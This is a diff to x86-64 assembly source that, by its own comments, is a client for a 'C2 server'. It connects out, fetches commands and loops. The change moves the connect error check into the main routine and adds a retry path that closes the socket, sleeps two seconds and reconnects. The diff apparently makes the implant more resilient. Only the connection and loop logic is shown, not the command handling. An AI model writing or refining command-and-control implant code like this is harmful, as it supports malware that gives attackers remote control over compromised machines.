@@ -669,13 +669,10 @@ fn_connect_client:
     
     ; Connect to socket
     mov rax, 0x2a               ; connect syscall
-    mov rdi, [socket_fd]        ; load socket file descriptor
-    lea rsi, [rsp]              ; address to stack parameter
-    mov rdx, 16                 ; size of sockaddr_in
+    mov rdi, [socket_fd]        ; Load socket file descriptor
+    lea rsi, [rsp]              ; Address to stack parameter
+    mov rdx, 16                 ; Size of sockaddr_in
     syscall
-
-    cmp rax, 0x0                ; error
-    jl fn_error_exit
 
     mov rsp, rbp
     pop rbp
@@ -726,6 +723,9 @@ _start:
     ; Connection to C2 server
     call fn_connect_client
 
+    test rax, rax                       ; Verify return code
+    jnz .server_no_connect
+
     ; Get command from server
     call fn_get_command
 
@@ -758,6 +758,14 @@ _start:
 
     ; Cleanup buffers
     call fn_cleanup
+    jmp .loop
+
+.server_no_connect:
+    ; Close newly made socket
+    call fn_close_socket
+    mov qword [sleep_time], 0x2         ; Sleep 2 seconds
+    call fn_sleep
+    mov qword [sleep_time], 0x0 
     jmp .loop
 
     ; Exit the program
